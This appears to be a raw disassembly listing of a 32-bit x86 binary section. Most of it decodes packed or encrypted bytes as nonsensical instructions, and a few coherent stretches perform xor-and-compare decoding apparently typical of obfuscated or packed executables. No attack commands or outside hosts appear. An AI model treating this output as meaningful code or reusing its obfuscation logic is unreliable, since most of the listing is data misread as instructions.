  4028e7:	jl     0x402965
  4028e9:	addr16 jle 0x402968
  4028ec:	jl     0x40293d
  4028ee:	enter  0xa0c1,0xd3
  4028f2:	and    ch,BYTE PTR [edx]
  4028f4:	xchg   ecx,eax
  4028f5:	in     eax,0xac
  4028f7:	iret   
  4028f8:	sbb    BYTE PTR [ecx-0x76],bl
  4028fb:	cmp    bh,BYTE PTR [ebp+0x3898b7f2]
  402901:	call   0x5092:0x2e8d95d3
  402908:	cmc    
  402909:	mov    dl,0x25
  40290b:	mov    al,ds:0x922c4b8
  402910:	pop    ds
  402911:	jbe    0x402962
  402913:	jns    0x402968
  402915:	push   esi
  402916:	mov    al,BYTE PTR [edi+0x7d]
  402919:	sti    
  40291a:	mov    ch,0x6c
  40291c:	dec    ebp
  40291d:	and    dl,BYTE PTR [ecx]
  40291f:	mov    dh,0x1f
  402921:	or     eax,0x632fd42f
  402926:	mov    eax,ds:0x537ca10b
  40292b:	scas   al,BYTE PTR es:[edi]
  40292c:	inc    edi
  40292d:	xchg   edi,eax
  40292e:	dec    esi
  40292f:	sar    DWORD PTR [esi-0x2c853a47],1
  402935:	xor    DWORD PTR [edi-0x25ae5ff2],ebx
  40293b:	and    DWORD PTR [ecx+0x4c],ecx
  40293e:	call   0x50301e2f
  402943:	push   0x4a9e79fa
  402948:	or     ch,0xf4
  40294b:	inc    ebx
  40294c:	call   0xc6d2a6f3
  402951:	dec    esp
  402952:	test   al,0xb4
  402954:	jge    0x402945
  402956:	pop    ds
  402957:	jnp    0x4029b7
  402959:	jae    0x402921
  40295b:	in     eax,0x7d
  40295d:	inc    ecx
  40295e:	or     eax,0x45deb168
  402963:	stos   BYTE PTR es:[edi],al
  402964:	les    esp,FWORD PTR [ebx-0x44f2ca60]
  40296a:	ficom  WORD PTR [eax]
  40296c:	sbb    al,BYTE PTR ds:0x10893616
  402972:	jnp    0x402989
  402974:	pop    ebx
  402975:	add    DWORD PTR [edi+0x5d],eax
  402978:	js     0x402972
  40297a:	xchg   esi,eax
  40297b:	add    DWORD PTR gs:[edi+0x13],0x9286bc28
  402983:	sbb    eax,0x8d0d8acc
  402988:	rcr    ecx,0xd9
  40298b:	mov    WORD PTR [esi-0x664fc22d],?
  402991:	in     al,0xa
  402993:	inc    esi
  402994:	pop    edi
  402995:	push   0x13
  402997:	mov    edi,0x8fa49983
  40299c:	jmp    0x835b:0x110e6ae4
  4029a3:	inc    ebp
  4029a4:	enter  0x3991,0xd4
  4029a8:	jo     0x402993
  4029aa:	ins    BYTE PTR es:[edi],dx
  4029ab:	adc    dh,BYTE PTR [bp+0x76a9]
  4029b0:	fadd   QWORD PTR [ecx-0x2d02f43a]
  4029b6:	int    0x5b
  4029b8:	fidivr DWORD PTR [ecx-0x47]
  4029bb:	xchg   ebx,eax
  4029bc:	loope  0x40299e
  4029be:	mov    eax,0xb844e8dc
  4029c3:	stos   BYTE PTR es:[edi],al
  4029c4:	xchg   esp,eax
  4029c5:	out    0xa6,al
  4029c7:	pop    ecx
  4029c8:	push   edx
  4029c9:	push   ss
  4029ca:	mov    esp,0xd2ce5eac
  4029cf:	(bad)  
  4029d0:	call   0x9ffa1cb4
  4029d5:	xor    al,0x6d
  4029d7:	bound  ebp,QWORD PTR [ebx]
  4029d9:	(bad)  
  4029db:	push   cs
  4029dc:	aas    
  4029dd:	jo     0x402978
  4029df:	adc    al,0xfa
  4029e1:	fdivrp st(7),st
  4029e3:	or     ah,BYTE PTR [esp+eax*8+0x2d]
  4029e7:	loope  0x402a1d
  4029e9:	adc    DWORD PTR [ebx+ebp*2+0x27ff9521],eax
  4029f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029f1:	or     BYTE PTR [ebx],bh
  4029f3:	inc    edx
  4029f4:	xchg   esp,eax
  4029f5:	ror    DWORD PTR [esi],1
  4029f7:	(bad)  
  4029f8:	dec    eax
  4029f9:	cmp    al,ah
  4029fb:	inc    eax
  4029fc:	add    al,0xea
  4029fe:	lea    edx,[ebp+0x1eaf2841]
  402a04:	(bad)  
  402a06:	mov    ds:0x9fa2a728,eax
  402a0b:	mov    bl,0x43
  402a0d:	xchg   BYTE PTR [ecx],dl
  402a0f:	and    edx,esp
  402a11:	jae    0x402994
  402a13:	ds mov dl,0xc
  402a16:	stos   DWORD PTR es:[edi],eax
  402a17:	mov    dh,0xbb
  402a19:	dec    esi
  402a1a:	dec    edx
  402a1b:	adc    al,0xe2
  402a1d:	mov    ch,0x24
  402a1f:	sti    
  402a20:	out    0xcd,eax
  402a22:	adc    eax,0xe485937a
  402a27:	arpl   WORD PTR [esi+ebx*8],dx
  402a2a:	fs cmp eax,0x93abae5e
  402a30:	sbb    eax,0x2d02a9ed
  402a35:	mov    ds:0x152dff1a,al
  402a3a:	pop    ebx
  402a3b:	push   ecx
  402a3c:	shl    al,cl
  402a3e:	pop    ecx
  402a3f:	and    ebx,DWORD PTR [eax-0x6d]
  402a42:	and    eax,0x4e85f4fe
  402a47:	repnz les ebp,FWORD PTR [esi+0x71]
  402a4b:	les    edi,FWORD PTR [edx+edi*4]
  402a4e:	xchg   esp,eax
  402a4f:	push   0x4a
  402a51:	(bad)  
  402a52:	sub    edi,edx
  402a54:	inc    edx
  402a55:	pop    eax
  402a56:	loop   0x402a8d
  402a58:	icebp  
  402a59:	inc    edi
  402a5a:	push   esi
  402a5b:	inc    esi
  402a5c:	xchg   esi,eax
  402a5d:	iret   
  402a5e:	stos   BYTE PTR es:[edi],al
  402a5f:	outs   dx,DWORD PTR ds:[esi]
  402a60:	int3   
  402a61:	lods   eax,DWORD PTR ds:[esi]
  402a62:	call   0xedcb74e0
  402a67:	shl    DWORD PTR [esi],0x59
  402a6a:	mov    ah,0x3c
  402a6c:	aam    0x20
  402a6e:	push   0x64
  402a70:	push   esp
  402a71:	pop    esi
  402a72:	adc    eax,0xcb051b30
  402a77:	test   BYTE PTR [ebx+0x1e34d826],ah
  402a7d:	mov    gs,WORD PTR [edi+0x1b]
  402a80:	out    dx,eax
  402a81:	dec    eax
  402a82:	ins    DWORD PTR es:[edi],dx
  402a83:	aaa    
  402a84:	outs   dx,DWORD PTR ds:[esi]
  402a85:	push   0x50462fbd
  402a8a:	inc    ebp
  402a8b:	cs call 0xb7bc6a5d
  402a91:	loop   0x402a30
  402a93:	xchg   esi,eax
  402a94:	fadd   QWORD PTR [edi]
  402a96:	mov    ch,0x44
  402a98:	or     esi,esp
  402a9a:	leave  
  402a9b:	fst    QWORD PTR [edi+0x5ecdca0d]
  402aa1:	and    DWORD PTR [esi],0x4c
  402aa4:	xlat   BYTE PTR ds:[ebx]
  402aa5:	lods   al,BYTE PTR ds:[esi]
  402aa6:	mov    ecx,0x42d89571
  402aab:	sub    BYTE PTR [ebp+eiz*8+0x5bcce71d],ch
  402ab2:	dec    ebx
  402ab3:	or     eax,0xf0a06dfc
  402ab8:	mov    ebx,0xd929d845
  402abd:	jne    0x402a72
  402abf:	push   es
  402ac0:	retf   0x883b
  402ac3:	adc    al,0x2c
  402ac5:	das    
  402ac6:	jmp    0x402a95
  402ac8:	add    BYTE PTR [edx+0x1941ab0a],bh
  402ace:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402acf:	sbb    eax,0x6c9edaa9
  402ad4:	scas   eax,DWORD PTR es:[edi]
  402ad5:	aas    
  402ad6:	inc    esi
  402ad7:	push   esi
  402ad8:	jns    0x402b09
  402ada:	add    WORD PTR [edx-0x3a],dx
  402ade:	js     0x402a90
  402ae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ae1:	test   al,0xe9
  402ae3:	mov    al,ds:0x8e2d39b2
  402ae8:	out    dx,al
  402ae9:	aas    
  402aea:	add    bl,cl
  402aec:	mov    BYTE PTR ds:0x801ca997,dl
  402af2:	sbb    eax,0x240504d
  402af7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402af8:	lods   eax,DWORD PTR ds:[esi]
  402af9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402afa:	std    
  402afb:	adc    eax,0xf60358d2
  402b00:	imul   DWORD PTR [eax]
  402b02:	dec    esp
  402b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b04:	jmp    0xfe36cef8
  402b09:	and    cl,BYTE PTR [edx+0x301a2f5d]
  402b0f:	(bad)  
  402b10:	scas   eax,DWORD PTR es:[edi]
  402b11:	pop    ss
  402b12:	ficomp DWORD PTR [edi+0x72]
  402b15:	pop    edx
  402b16:	pop    ss
  402b17:	mov    DWORD PTR [eax+0x17b65a95],ebx
  402b1d:	cmc    
  402b1e:	sub    DWORD PTR [ebp+0x46cafb3e],edi
  402b24:	dec    ebx
  402b25:	dec    esp
  402b26:	in     eax,0x47
  402b28:	enter  0x1bc6,0xf6
  402b2c:	test   BYTE PTR [edi],dl
  402b2e:	sbb    edx,DWORD PTR [ebx+0xde6928]
  402b34:	push   ebp
  402b35:	jnp    0x402bb6
  402b37:	scas   al,BYTE PTR es:[edi]
  402b38:	call   0xc449:0x5b3371f0
  402b3f:	(bad)  
  402b40:	ret    
  402b41:	pop    edx
  402b42:	lock push es
  402b44:	into   
  402b45:	sub    bl,BYTE PTR [esi+edx*1]
  402b48:	mov    esi,0x4859eaf
  402b4d:	daa    
  402b4e:	lods   al,BYTE PTR ds:[esi]
  402b4f:	pop    esi
  402b50:	lahf   
  402b51:	xchg   edi,eax
  402b52:	and    bh,ah
  402b54:	ins    BYTE PTR es:[edi],dx
  402b55:	and    ch,dl
  402b57:	cmp    dl,BYTE PTR [edi+0x71]
  402b5a:	sbb    al,0x4c
  402b5c:	les    ebp,FWORD PTR [esi-0x58]
  402b5f:	jnp    0x402af6
  402b61:	not    dh
  402b63:	loopne 0x402bab
  402b65:	outs   dx,BYTE PTR ds:[esi]
  402b66:	in     al,0xca
  402b68:	cmp    al,0xaa
  402b6a:	cmp    al,0x3e
  402b6c:	fst    DWORD PTR [edi+ebp*1]
  402b6f:	xchg   esi,eax
  402b70:	jle    0x402b53
  402b72:	in     eax,0xd0
  402b74:	pop    esi
  402b75:	sbb    DWORD PTR [edx-0x64ecb8cb],eax
  402b7b:	push   esi
  402b7c:	push   ss
  402b7d:	xchg   esi,eax
  402b7e:	mov    edx,0xec82a16b
  402b83:	sbb    BYTE PTR [edx-0x668663f5],bh
  402b89:	add    al,0xe9
  402b8b:	into   
  402b8c:	outs   dx,BYTE PTR ds:[esi]
  402b8d:	xchg   esi,eax
  402b8e:	mov    esi,0xd75b280c
  402b93:	or     DWORD PTR [ecx],edi
  402b95:	cmc    
  402b96:	test   BYTE PTR [edi+0x1b552fce],cl
  402b9c:	test   al,bl
  402b9e:	push   es
  402b9f:	jmp    0x422f8d5a
  402ba4:	fld    TBYTE PTR [edi]
  402ba6:	das    
  402ba7:	sbb    BYTE PTR [eax+0x8648681],dl
  402bad:	sub    DWORD PTR ds:0x8cbd0f40,0x27
  402bb4:	or     al,cl
  402bb6:	adc    ecx,eax
  402bb8:	gs scas eax,DWORD PTR es:[edi]
  402bba:	shl    BYTE PTR [eax],0x2b
  402bbd:	inc    ecx
  402bbe:	mov    esi,0x8b601940
  402bc3:	jl     0x402bf6
  402bc5:	adc    eax,0x540db25d
  402bca:	clc    
  402bcb:	sub    al,0xc7
  402bcd:	aad    0xc6
  402bcf:	xlat   BYTE PTR ds:[ebx]
  402bd0:	xchg   esi,eax
  402bd1:	imul   ebp,DWORD PTR [esi+eax*1+0x408be809],0x3c
  402bd9:	lea    ecx,[ecx*8+0x78]
  402be0:	add    eax,ecx
  402be2:	mov    ecx,DWORD PTR [ebp-0x8]
  402be5:	mov    ecx,DWORD PTR [ecx]
  402be7:	mov    eax,DWORD PTR [eax+ecx*1]
  402bea:	mov    DWORD PTR [ebp-0x1c],eax
  402bed:	mov    eax,DWORD PTR [ebp+0x8]
  402bf0:	xor    eax,esi
  402bf2:	add    eax,edi
  402bf4:	mov    DWORD PTR [ebp-0x20],eax
  402bf7:	mov    eax,DWORD PTR [ebp+0x8]
  402bfa:	mov    ecx,DWORD PTR [ebp-0x1c]
  402bfd:	xor    eax,esi
  402bff:	add    eax,edi
  402c01:	cmp    ecx,eax
  402c03:	je     0x402f69
  402c09:	mov    eax,DWORD PTR [ebp-0x8]
  402c0c:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c0f:	add    ecx,DWORD PTR [eax]
  402c11:	mov    DWORD PTR [ebp-0x20],ecx
  402c14:	mov    eax,DWORD PTR [ebp-0x20]
  402c17:	mov    ecx,DWORD PTR [ebp-0x8]
  402c1a:	mov    eax,DWORD PTR [eax+0xc]
  402c1d:	mov    ecx,DWORD PTR [ecx]
  402c1f:	mov    al,BYTE PTR [eax+ecx*1]
  402c22:	add    al,0x39
  402c24:	xor    al,0x45
  402c26:	cmp    al,0xc1
  402c28:	je     0x402c3f
  402c2e:	mov    eax,DWORD PTR [ebp+0x8]
  402c31:	mov    ecx,DWORD PTR [ebp-0x8]
  402c34:	xor    eax,esi
  402c36:	add    eax,edi
  402c38:	mov    DWORD PTR [ecx],eax
  402c3a:	jmp    0x402f69
  402c3f:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  402c46:	jmp    0x402f69
  402c4b:	mov    eax,DWORD PTR [ebp-0x8]
  402c4e:	mov    ecx,DWORD PTR [ebp-0x18]
  402c51:	mov    ecx,DWORD PTR [ecx]
  402c53:	mov    DWORD PTR [eax],ecx
  402c55:	mov    eax,DWORD PTR [ebp+0xc]
  402c58:	mov    eax,DWORD PTR [ebp+0x8]
  402c5b:	jmp    0x402f61
  402c60:	add    al,0x8f
  402c62:	and    ecx,0xffffff93
  402c65:	std    
  402c66:	bound  ebp,QWORD PTR [ecx-0x45]
  402c69:	or     DWORD PTR [edi+0x5d],eax
  402c6c:	dec    ebx
  402c6d:	mov    cl,bh
  402c6f:	das    
  402c70:	les    edx,FWORD PTR ds:0x7e677c7c
  402c76:	jl     0x402cf4
  402c78:	jnp    0x402cae
  402c7a:	mov    ch,0x92
  402c7c:	dec    ebx
  402c7d:	xlat   BYTE PTR ds:[ebx]
  402c7e:	test   BYTE PTR [ecx],dh
  402c80:	jmp    0xe308:0x2d99179d
  402c87:	les    ecx,FWORD PTR [edi]
  402c89:	add    eax,0x38d79b19
  402c8e:	fisub  DWORD PTR [edx-0x1bed22d1]
  402c94:	xor    eax,edx
  402c96:	data16 cmp al,0x15
  402c99:	cmp    edi,DWORD PTR [edx*2-0x6ea6e97]
  402ca0:	pop    ebp
  402ca1:	mov    dh,ch
  402ca3:	in     eax,0xfa
  402ca5:	mov    bh,0x43
  402ca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ca8:	sub    al,0xe0
  402caa:	push   0xfffffffc
  402cac:	mov    edi,0xfa5406d6
  402cb1:	xchg   ebx,eax
  402cb2:	mov    esp,eax
  402cb4:	iret   
  402cb5:	stc    
  402cb6:	cld    
  402cb7:	mov    DWORD PTR [eax+0x62],ebx
  402cba:	xchg   BYTE PTR [esi+eiz*2],dl
  402cbd:	push   0xffffffa7
  402cbf:	xchg   ecx,eax
  402cc0:	shl    BYTE PTR [ebx+0x52],cl
  402cc3:	push   ebx
  402cc4:	scas   al,BYTE PTR es:[edi]
  402cc5:	and    BYTE PTR [eax],ch
  402cc7:	and    eax,0xbbd045ee
  402ccc:	pop    esp
  402ccd:	(bad)  [ebx+eax*2]
  402cd0:	arpl   WORD PTR ds:0x86e0ebb7,cx
  402cd6:	pop    edi
  402cd7:	jmp    0x402c8d
  402cd9:	mov    eax,0xceeac32
  402cde:	test   al,0x88
  402ce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ce1:	ja     0x402ccc
  402ce3:	fbld   TBYTE PTR [ebp+0x62a8f623]
  402ce9:	shr    DWORD PTR [di],0x6d
  402ced:	into   
  402cee:	and    al,0x9c
  402cf0:	pop    edx
  402cf1:	pop    ds
  402cf2:	je     0x402d71
  402cf4:	fmul   QWORD PTR [eax+0x74da563f]
  402cfa:	add    DWORD PTR [esi+0x21],edi
  402cfd:	pop    edi
  402cfe:	pop    ebx
  402cff:	mov    dh,0x8c
  402d01:	xchg   BYTE PTR [eax],ah
  402d03:	push   eax
  402d04:	mov    bl,0xe0
  402d06:	out    dx,al
  402d07:	adc    DWORD PTR [eax+0x13e80322],edi
  402d0d:	stos   BYTE PTR es:[edi],al
  402d0e:	(bad)  
  402d0f:	xchg   edx,eax
  402d10:	sub    eax,0x80a2d60c
  402d15:	es jp  0x402d58
  402d18:	imul   edx,edi,0xffffffee
  402d1b:	mov    cl,BYTE PTR [eax-0x3b]
  402d1e:	jb     0x402d84
  402d20:	mov    ecx,0xeeae10a9
  402d25:	xchg   edi,eax
  402d26:	aad    0x70
  402d28:	pop    eax
  402d29:	pop    edx
  402d2a:	sbb    eax,0xce3c86a7
  402d2f:	in     al,0x74
  402d31:	cdq    
  402d32:	add    BYTE PTR [edx+0x4ea506c8],dh
  402d38:	in     al,0x60
  402d3a:	push   ecx
  402d3b:	les    ebx,FWORD PTR [eax+0x3f]
  402d3e:	or     al,0xc8
  402d40:	sbb    esp,DWORD PTR [eax]
  402d42:	cli    
  402d43:	enter  0xcc06,0x51
  402d47:	hlt    
  402d48:	pop    ds
  402d49:	ins    BYTE PTR es:[edi],dx
  402d4a:	out    dx,eax
  402d4b:	je     0x402d9b
  402d4d:	inc    edi
  402d4e:	sbb    eax,0xeccbbfe5
  402d53:	xchg   edi,eax
  402d54:	retf   0x5b0a
  402d57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d58:	idiv   edi
  402d5a:	cmp    DWORD PTR [ecx+0x43],ebp
  402d5d:	cmp    BYTE PTR [esi+0x3d],cl
  402d60:	adc    eax,0xde11584b
  402d65:	xchg   ecx,eax
  402d66:	out    0x44,eax
  402d68:	popa   
  402d69:	int    0xd8
  402d6b:	adc    DWORD PTR [esi],ebx
  402d6d:	inc    eax
  402d6e:	adc    edi,DWORD PTR [esi+0x7a]
  402d71:	ins    BYTE PTR es:[edi],dx
  402d72:	sti    
  402d73:	ret    
  402d74:	arpl   WORD PTR ds:0x75fdbe27,sp
  402d7a:	jl     0x402df6
  402d7c:	loopne 0x402de5
  402d7e:	es in  eax,dx
  402d80:	pop    eax
  402d81:	mov    eax,ds:0x238eff50
  402d86:	retf   0x2627
  402d89:	ins    DWORD PTR es:[edi],dx
  402d8a:	fist   DWORD PTR [ecx+ebx*2-0x38113a75]
  402d91:	out    0xe1,eax
  402d93:	data16 sub ch,dl
  402d96:	fidivr DWORD PTR [ebp+0x1a]
  402d99:	hlt    
  402d9a:	pop    esi
  402d9b:	xor    DWORD PTR [esi-0x21],0xfffffff4
  402d9f:	pusha  
  402da0:	push   eax
  402da1:	shl    BYTE PTR [edx-0x576fffb9],0x53
  402da8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402da9:	mov    dh,0x63
  402dab:	jg     0x402df4
  402dad:	cdq    
  402dae:	outs   dx,DWORD PTR ds:[esi]
  402daf:	sub    DWORD PTR [ebp-0x35],edi
  402db2:	add    eax,0x723b5859
  402db7:	lods   eax,DWORD PTR ds:[esi]
  402db8:	jecxz  0x402e2f
  402dba:	mov    DWORD PTR [edi-0x12],ebx
  402dbd:	mov    eax,0xde513847
  402dc2:	jns    0x402e00
  402dc4:	out    dx,al
  402dc5:	repz or eax,0xdd0a9546
  402dcb:	or     bl,BYTE PTR [ebp-0x5370ddd8]
  402dd1:	pcmpgtw mm1,mm7
  402dd4:	inc    esp
  402dd5:	jae    0x402dbf
  402dd7:	and    dh,BYTE PTR [ebx]
  402dd9:	sub    al,0x82
  402ddb:	mov    ebp,0x109bb8c9
  402de0:	inc    ebp
  402de1:	mov    al,ds:0x5be7e844
  402de6:	cmp    eax,0xdc434231
  402deb:	inc    edi
  402dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ded:	pop    edx
  402dee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402def:	mov    ebp,0x5ba0dee
  402df4:	mov    ds:0xbcd8f466,eax
  402df9:	dec    esi
  402dfa:	inc    ecx
  402dfb:	ret    0x16d5
  402dfe:	dec    BYTE PTR [edx+0x452daa7d]
  402e04:	add    cl,BYTE PTR ds:0xfbcb01a6
  402e0a:	or     ecx,DWORD PTR [ebx+0x605adcdb]
  402e10:	iret   
  402e11:	je     0x402e2b
  402e13:	mov    ah,BYTE PTR [eax]
  402e15:	adc    bh,ah
  402e17:	test   DWORD PTR ds:0x2c784bdf,ecx
  402e1d:	data16 mov dh,0x33
  402e20:	inc    ebp
  402e21:	adc    dh,BYTE PTR [esi-0x57]
  402e24:	dec    edi
  402e25:	mov    ebp,0xf15ea1c
  402e2a:	or     al,BYTE PTR [edx-0x22]
  402e2d:	pusha  
  402e2e:	jns    0x402dc7
  402e30:	(bad)  
  402e31:	in     eax,dx
  402e32:	push   edi
  402e33:	mov    ebp,DWORD PTR [esi-0x6549d0c2]
  402e39:	gs push 0x98aa0fee
  402e3f:	imul   eax,esp,0xffffff8c
  402e42:	xchg   BYTE PTR [ebp-0x4ff69ec9],bl
  402e48:	stos   DWORD PTR es:[edi],eax
  402e49:	cdq    
  402e4a:	rol    ecx,0xe
  402e4d:	sbb    DWORD PTR [ecx-0x6cded77c],eax
  402e53:	mov    ds:0x612510e3,al
  402e58:	jmp    0x402e77
  402e5a:	mov    ah,BYTE PTR [ebp+0x4c]
  402e5d:	out    0xa,eax
  402e5f:	mov    eax,0x50e915f8
  402e64:	jge    0x402ec4
  402e66:	std    
  402e67:	fwait
  402e68:	sar    DWORD PTR [ebx-0x18],1
  402e6b:	mov    al,0x37
  402e6d:	imul   BYTE PTR [ebx-0x58]
  402e70:	mov    ebp,0x63dab55f
  402e75:	mov    al,0xcf
  402e77:	adc    eax,0x63673dd5
  402e7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e7d:	and    DWORD PTR [edi],eax
  402e7f:	int3   
  402e80:	jne    0x402f01
  402e82:	out    dx,al
  402e83:	imul   ecx,DWORD PTR [esi+0x1fdc970b],0xde226681
  402e8d:	sbb    al,0x15
  402e8f:	shl    BYTE PTR [eax-0x3d],1
  402e92:	mov    eax,0x19fa625a
  402e97:	inc    ebp
  402e98:	sub    eax,0xe73ef4cb
  402e9d:	mov    al,ds:0xaa7bc70e
  402ea2:	jno    0x402e8e
  402ea4:	mov    ebx,0xb921304
  402ea9:	cmp    al,cl
  402eab:	pusha  
  402eac:	cld    
  402ead:	in     al,dx
  402eae:	dec    ebx
  402eaf:	xchg   ebx,eax
  402eb0:	mov    ebp,0x4275ebdf
  402eb5:	mov    ecx,0xc9f078f1
  402eba:	shr    DWORD PTR [edx+0x19],cl
  402ebd:	add    al,0x23
  402ebf:	sbb    eax,0x6c46b138
  402ec4:	out    dx,eax
  402ec5:	pop    ebp
  402ec6:	cmc    
  402ec7:	ins    BYTE PTR es:[edi],dx
  402ec8:	lea    edx,[edi-0x506cba33]
  402ece:	xor    dl,bl
  402ed0:	frstor [ebx]
  402ed2:	sahf   
  402ed3:	push   esp
  402ed4:	xchg   dh,bl
  402ed6:	and    esi,eax
  402ed8:	cwde   
  402ed9:	sbb    BYTE PTR [ebx],al
  402edb:	loop   0x402ecf
  402edd:	(bad)  
  402ede:	popa   
  402edf:	sub    al,0xad
  402ee1:	nop
  402ee2:	in     eax,0x43
  402ee4:	stos   DWORD PTR es:[edi],eax
  402ee5:	popa   
  402ee6:	pop    esi
  402ee7:	mov    al,0xe5
  402ee9:	jb     0x402e7d
  402eeb:	retf   0x5c65
  402eee:	test   BYTE PTR [ebx],ch
  402ef0:	jnp    0x402edb
  402ef2:	repz sub edi,edx
  402ef5:	test   cl,ah
  402ef7:	aaa    
  402ef8:	inc    esi
  402ef9:	mov    cl,0xcf
  402efb:	jmp    0x2680:0x2ea1a595
  402f02:	mov    bl,0xf1
  402f04:	pop    es
  402f05:	and    al,0x95
  402f07:	test   al,0x4
  402f09:	popa   
  402f0a:	into   
  402f0b:	xchg   esi,eax
  402f0c:	and    ebx,ecx
  402f0e:	fwait
  402f0f:	mov    bl,0x89
  402f11:	mov    dl,0x9a
  402f13:	aas    
  402f14:	(bad)  
  402f15:	jno    0x402f7b
  402f17:	mov    edi,0x321422a8
  402f1c:	cmp    al,0xa2
  402f1e:	repz test DWORD PTR [ebx-0x163eb155],ecx
  402f25:	std    
  402f26:	fnstcw WORD PTR [esp+ebp*4+0x65]
  402f2a:	cli    
  402f2b:	mov    ecx,0xaa593cde
  402f30:	jg     0x402ed1
  402f32:	adc    al,0xe
  402f34:	mov    cl,0x52
  402f36:	cld    
  402f37:	aam    0xc7
  402f39:	mov    edi,0x492bdb1b
  402f3e:	daa    
  402f3f:	mov    dh,0x89
  402f41:	fisttp DWORD PTR [ebx+0x9f229e]
  402f47:	inc    ecx
  402f48:	add    ebp,DWORD PTR [ebp-0x1fa4f532]
  402f4e:	enter  0x12e,0x7d
  402f52:	lods   al,BYTE PTR ds:[esi]
  402f53:	and    al,0x46
  402f55:	fistp  QWORD PTR [edx+eiz*2-0x4df0c9f6]
  402f5c:	pop    ebp
  402f5d:	in     al,0x5c
  402f5f:	mov    bh,0x13
  402f61:	push   DWORD PTR [ebp-0x8]
  402f64:	call   0x4062cd
  402f69:	mov    eax,DWORD PTR [ebp-0xc]
  402f6c:	cmp    eax,ebx
  402f6e:	je     0x401817
  402f74:	mov    eax,DWORD PTR [ebp-0x8]
  402f77:	mov    eax,DWORD PTR [eax]
  402f79:	pop    edi
  402f7a:	pop    esi
  402f7b:	jmp    0x403281
  402f80:	imul   ebx,DWORD PTR [eax],0x54
  402f83:	cmc    
  402f84:	push   edi
  402f85:	jge    0x403004
  402f87:	call   0xa003:0x1360eb95
  402f8e:	das    
  402f8f:	dec    ecx
  402f90:	das    
  402f91:	push   ss
  402f92:	jl     0x403010
  402f94:	addr16 jle 0x403013
  402f97:	jl     0x403001
  402f99:	sub    edx,DWORD PTR [eax]
  402f9b:	into   
  402f9c:	aam    0xbd
  402f9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f9f:	mov    eax,0xfae440a8
  402fa4:	lahf   
  402fa5:	sbb    al,0x92
  402fa7:	mov    ah,0x93
  402fa9:	clc    
  402faa:	in     al,dx
  402fab:	das    
  402fac:	mov    cl,0x4b
  402fae:	das    
  402faf:	(bad)  
  402fb0:	or     BYTE PTR [esi+0x6],ah
  402fb3:	sbb    DWORD PTR [edi+0x1d],ecx
  402fb6:	ffreep st(1)
  402fb8:	fcomp  QWORD PTR [ebx]
  402fba:	fwait
  402fbb:	mov    esi,0xedc27cdc
  402fc0:	call   DWORD PTR [esi]
  402fc2:	sub    DWORD PTR [eax+eax*8],edx
  402fc5:	adc    ch,BYTE PTR [ebp+eiz*8-0x76]
  402fc9:	xchg   BYTE PTR ds:[esi+0x79082662],dl
  402fd0:	fld    QWORD PTR [ecx-0x22]
  402fd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fd4:	add    al,0xdb
  402fd6:	inc    esi
  402fd7:	sbb    DWORD PTR [ebx+0x38],edx
  402fda:	add    al,0x6f
  402fdc:	cmp    ah,bh
  402fde:	add    eax,0x1745cea7
  402fe3:	scas   eax,DWORD PTR es:[edi]
  402fe4:	cwde   
  402fe5:	cld    
  402fe6:	fwait
  402fe7:	dec    edi
  402fe8:	out    dx,al
  402fe9:	ins    BYTE PTR es:[edi],dx
  402fea:	adc    DWORD PTR [eax+0x77],esp
  402fed:	mov    WORD PTR [ebx+0x42],ds
  402ff0:	mov    ?,WORD PTR [ecx+0x74]
  402ff3:	or     edi,DWORD PTR [edi+edi*8+0x0]
  402ff7:	jnp    0x403075
  402ff9:	int    0xe6
  402ffb:	or     esi,ebx
  402ffd:	and    eax,0x2ac1d81b
  403002:	fucom  st(7)
  403004:	mov    ah,0xe3
  403006:	imul   ebp,DWORD PTR [ebp-0x58],0x4
  40300a:	jmp    0x8b2:0x11e724ca
  403011:	dec    ecx
  403013:	in     eax,0xc4
  403015:	mov    bh,0x48
  403017:	lea    ecx,[esi+0x7]
  40301a:	rcr    BYTE PTR [edi+eiz*1-0x64],cl
  40301e:	loop   0x403039
  403020:	aas    
  403021:	jg     0x403068
  403023:	pop    esp
  403024:	ss dec eax
  403026:	cs push ss
  403028:	(bad)  
  403029:	sbb    BYTE PTR gs:[ebp+0x5ab4bf2c],0xef
  403031:	mov    dh,0x22
  403033:	cdq    
  403034:	push   ebx
  403035:	fs stos BYTE PTR es:[edi],al
  403037:	jmp    0x402fc4
  403039:	and    al,0x17
  40303b:	fstp   QWORD PTR [eax-0x59e487f7]
  403041:	xchg   esp,eax
  403042:	mov    eax,0x73303030
  403047:	(bad)  
  403048:	mov    ds:0x563e83ec,eax
  40304d:	ja     0x402feb
  40304f:	xchg   ebx,eax
  403050:	adc    bl,BYTE PTR [edi]
  403052:	mov    al,0x1a
  403054:	mov    dh,0x26
  403056:	in     eax,0x91
  403058:	mov    al,ds:0x7a7a61d6
  40305d:	xor    DWORD PTR [edi+0x158b43a8],0x894cdcf4
  403067:	xchg   edx,eax
  403068:	sbb    ecx,ebp
  40306a:	jge    0x40306a
  40306c:	gs and al,0x85
  40306f:	push   esp
  403070:	test   BYTE PTR [edx+0x4],cl
  403073:	pop    eax
  403074:	or     edi,esi
  403076:	cld    
  403077:	cmc    
  403078:	dec    edx
  403079:	enter  0x82ac,0x8a
  40307d:	inc    eax
  40307e:	jmp    0x146:0x16d2
  403084:	mov    ah,0xd1
  403086:	jnp    0x40303f
  403088:	(bad)  
  403089:	and    edx,DWORD PTR [ebx-0x2140746b]
  40308f:	frstor [ebp-0x78]
